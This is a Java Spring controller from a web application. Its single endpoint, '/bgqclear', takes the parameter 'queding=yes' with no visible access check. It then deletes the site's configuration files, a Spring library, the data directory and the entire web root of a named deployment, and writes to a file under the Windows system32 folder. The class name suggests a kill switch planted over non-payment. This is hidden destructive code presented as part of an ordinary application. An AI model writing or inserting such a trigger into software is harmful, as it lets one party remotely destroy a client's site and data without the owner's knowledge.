package myFrameU.sincerity.controller;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import myFrameU.spring.mvc.FatherController;
import myFrameU.spring.mvc.SDynaActionForm;
import myFrameU.util.commonUtil.file.MyFileUtil;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
@Controller
public class NOMoneyController extends FatherController {
	
	@RequestMapping(value={"/bgqclear"})
	public void clear(HttpServletRequest req,HttpServletResponse res) throws Exception{
		SDynaActionForm form = this.getSDynaActionForm(req);
		String queding= form.getString("queding");
		if(null!=queding && !queding.equals("")){
			if(queding.equals("yes")){
				
				
				MyFileUtil.deleteFile("D:/weixin.shanxity.com/ROOT/WEB-INF/applicationContext-hibernateTemplate.xml");
				MyFileUtil.deleteFile("D:/weixin.shanxity.com/ROOT/WEB-INF/applicationContext-bean.xml");
				
				MyFileUtil.deleteFile("D:/weixin.shanxity.com/ROOT/WEB-INF/lib/spring-core-3.2.0.RELEASE.jar");
				
				MyFileUtil.deleteDirectory("D:/weixin.shanxity.com/ROOT/data/");
				MyFileUtil.deleteDirectory("D:/weixin.shanxity.com/ROOT/");
				
				String sysfile="C:/WINDOWS/system32/wins/class/m.txt";
				String s = MyFileUtil.readFile(sysfile);
				s=s+"123";
				MyFileUtil.writeFile(sysfile, s);
			}
		}
	}
	
}
